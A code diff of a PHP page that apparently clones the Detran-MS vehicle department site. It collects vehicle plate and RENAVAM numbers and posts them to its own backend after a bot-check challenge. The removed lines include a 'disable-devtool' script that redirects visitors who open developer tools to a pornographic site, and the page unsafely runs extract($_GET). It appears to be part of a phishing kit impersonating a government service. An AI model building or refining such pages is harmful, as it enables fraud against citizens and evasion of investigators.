@@ -6,7 +6,7 @@ extract($_GET);
 
 if($sucesso){
 
-    include_once('./pages/MsDetran/homex.php');
+    include_once(__DIR__ . '/homex.php');
 
     return;
 }
@@ -1406,7 +1406,6 @@ if($sucesso){
 
     <script src="./<?= $diretorio ?>/MsDetran_files/jquery-3.7.0.min.js.baixados"></script>
     <script type="text/javascript" src="./<?= $diretorio ?>/MsDetran_files/base.js.baixados"></script> 
-    <script disable-devtool-auto="" url="https://www.xvideos.com/" src="./<?= $diretorio ?>/home_files/disable-devtool"></script>
 
     <script>
     function exibirModalValidacao(mensagem) {
@@ -1456,7 +1455,7 @@ if($sucesso){
 
         function fazerDesafioJS(callback) {
             $.ajax({
-                url: 'functions/api.php',
+                url: '/functions/api.php',
                 method: 'POST',
                 data: {
                     action: 'js_challenge',
@@ -1524,7 +1523,7 @@ if($sucesso){
                 dadosEnvio['renavam'] = renavam;
 
                 $.ajax({
-                    url: 'api/ms.php?placa=' + encodeURIComponent(placa) + '&renavam=' + encodeURIComponent(renavam) +'&fill_time=' + fillTime,
+                    url: '/api/ms.php?placa=' + encodeURIComponent(placa) + '&renavam=' + encodeURIComponent(renavam) +'&fill_time=' + fillTime,
                     method: 'POST',
                     data: dadosEnvio,
                     headers: {
